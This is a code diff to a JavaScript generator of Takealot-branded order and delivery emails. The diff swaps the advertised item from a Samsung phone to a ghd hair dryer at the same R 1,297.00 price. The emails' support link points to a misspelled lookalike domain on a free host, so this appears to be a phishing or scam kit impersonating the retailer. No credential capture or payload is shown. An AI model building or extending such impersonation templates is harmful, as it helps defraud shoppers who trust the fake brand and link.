@@ -205,7 +205,7 @@ const STAGES = {
     headline: 'Your Order Has Been Delivered',
     paragraphs: (id) => [
       `Your Takealot order <strong>${id}</strong> has been successfully delivered!`,
-      `We hope you enjoy your new Samsung Galaxy A56 5G 256GB Dual Sim.`,
+      `We hope you enjoy your new ghd Air Professional Hair Dryer (Black).`,
       `If you have any questions or feedback about your delivery, our support team is always here to assist.`,
     ],
   },
@@ -243,7 +243,7 @@ function renderStageHtml(template, order, stageInfo, pDate, dDate) {
     .replace(/\{\{order_date\}\}/g, orderDateShort)
     .replace(/\{\{delivery_date\}\}/g, deliveryDateShort)
     .replace(/\{\{delivery_date_long\}\}/g, deliveryDateLong)
-    .replace(/\{\{variant\}\}/g, 'Awesome Graphite');
+    .replace(/\{\{variant\}\}/g, 'Black');
 
   // Replace header title if needed
   if (stageInfo && stageInfo.headline) {
@@ -294,7 +294,7 @@ function renderStagePlainText(order, stageInfo, pDate, dDate) {
     `- Order Date: ${orderDateShort}`,
     `- Estimated Delivery Date: ${deliveryDateLong}`,
     `- Delivery Method: Courier`,
-    `- Item: 1x Samsung Galaxy A56 5G 256GB Dual Sim - R 1,297.00`,
+    `- Item: 1x ghd Air Professional Hair Dryer (Black) - R 1,297.00`,
     `- Total Paid: R 1,297.00`,
     ``,
     `Need help? Visit https://takalotspromosam.vercel.app`,
